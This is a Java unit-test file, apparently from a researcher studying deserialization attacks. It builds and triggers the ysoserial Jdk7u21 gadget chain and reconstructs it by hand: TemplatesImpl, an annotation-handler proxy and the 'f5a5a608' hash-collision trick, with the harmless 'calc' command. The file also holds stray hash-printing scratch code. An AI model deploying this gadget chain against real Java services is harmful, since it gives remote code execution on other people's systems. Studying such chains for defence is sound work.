package angelwhu.payloadTest;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

import javax.xml.transform.Templates;

import org.junit.Test;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import ysoserial.payloads.CommonsBeanutilsCollectionsLogging1;
import ysoserial.payloads.Jdk7u21;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.Spring1;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;
import angelwhu.serialization.SerializationUtil;

public class Jdk7u21PayloadTest {

	@Test
	public void testPayload() throws Exception
	{
		
		
		String command = "calc";
		ObjectPayload<?> payload = new Jdk7u21();
		final Object object = payload.getObject(command);
		SerializationUtil.readObjectFromStream(object);
		
	}
	
	@Test
	public void testHash() throws Exception
	{
		final TemplatesImpl templates = Gadgets.createTemplatesImpl("calc");

		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
		Reflections.setFieldValue(tempHandler, "type", Templates.class);
		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

		LinkedHashSet set = new LinkedHashSet(); // maintain order
		set.add(templates);
		set.add(proxy);

		Reflections.setFieldValue(templates, "_auxClasses", null);
		Reflections.setFieldValue(templates, "_class", null);

		map.put(zeroHashCodeStr, templates); // swap in real object
		int hash1 = templates.hashCode();
		int hash2 = proxy.hashCode();
		System.out.println(hash1);
		System.out.println(hash2);
		
		
		int hash3 = zeroHashCodeStr.hashCode();
		System.out.println(hash3);
		
		int hash4 = stringHashCode(zeroHashCodeStr);
		
		StringBuffer a = new StringBuffer("abc");
		StringBuffer b = a;
		b.append("123");
		System.out.println(a.toString());
		System.out.println(b.toString());
		
	}
	
    public int stringHashCode(String str) {
		int h = 0;
	    int len = str.length();
		if (h == 0 && len > 0) {
		    int off = 0;
		    char val[] = str.toCharArray();
	
            for (int i = 0; i < len; i++) {
                h = 31*h + val[off++];
            }
        }
        return h;
    }
    
}
